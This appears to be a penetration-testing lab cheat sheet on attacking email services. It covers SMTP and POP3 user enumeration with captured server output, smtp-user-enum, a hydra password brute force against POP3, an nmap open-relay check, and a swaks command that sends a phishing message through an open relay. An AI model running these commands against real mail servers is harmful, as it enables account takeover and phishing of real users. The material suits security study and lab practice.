| **Port**  | **Service**                                                                | **Used to Send/Receive**          |
| --------- | -------------------------------------------------------------------------- | --------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           | Sending emails only               |
| `TCP/143` | IMAP4 Unencrypted                                                          | Receiving emails                  |
| `TCP/110` | POP3 Unencrypted                                                           | Receiving emails                  |
| `TCP/465` | SMTP Encrypted                                                             | Sending emails securely (SSL/TLS) |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) | Sending emails with encryption    |
| `TCP/993` | IMAP4 Encrypted                                                            | Receiving emails securely         |
| `TCP/995` | POP3 Encrypted                                                             | Receiving emails securely         |
### User Enumeration

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root

252 2.0.0 root

VRFY www-data

252 2.0.0 www-data

VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

EXPN john

250 2.1.0 john@inlanefreight.htb

EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio

550 5.1.1 julio... User unknown

RCPT TO:kate

550 5.1.1 kate... User unknown

RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.


```bash
telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR

USER john

+OK
```

### Summary

| **Command** | **Function**                                                                                                                   |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------ |
| VRFY        | Verifies the existence of a specific email address. Returns the full address if valid, otherwise indicates non-existence.      |
| EXPN        | Expands a mailing list or group. Returns the members of the mailing list if available, or an error if the list does not exist. |
| **RCPT TO** | Specifies the recipient(s) of an email in the SMTP transaction. Used to define individual or multiple recipients.              |

### Automatite Process

```bash
smtp-user-enum -M RCPT -U userlist.txt -d inlanefreight.htb -t 10.129.203.7
```

Once users have been gather we can brute force the password:

```bash
hydra -l marlin@inlanefreight.htb -P passwords.list -f 10.129.203.12 pop3 -VV -F -I -t 64
```

### Open Relay

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

Send Email to Open Relay:

```bash
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

### Connect to POP3 - Retrieve Emails

Connect and enter username and password:

```bash
telnet 10.129.203.12 110
Trying 10.129.203.12...
Connected to 10.129.203.12.
Escape character is '^]'.
+OK POP3 server ready
USER john.doe
+OK User name accepted, password please
PASS mypassword123
+OK Mailbox locked and ready
```

Check Messages:

```bash
LIST
+OK 1 messages (601 octets)
1 601
```

Retrieve Message 1:

```bash
RETR 1
```

